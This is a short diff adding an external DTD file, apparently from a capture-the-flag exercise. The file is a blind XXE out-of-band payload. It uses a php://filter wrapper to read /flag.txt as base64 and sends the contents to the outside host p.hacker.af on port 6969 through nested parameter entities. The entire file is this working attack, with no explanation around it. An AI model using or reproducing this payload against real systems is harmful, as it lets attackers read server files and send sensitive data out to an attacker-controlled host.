@@ -1,0 +1,6 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM
+'http://p.hacker.af:6969/?p=%payl;'>"> 
+%int;
+%trick;
+
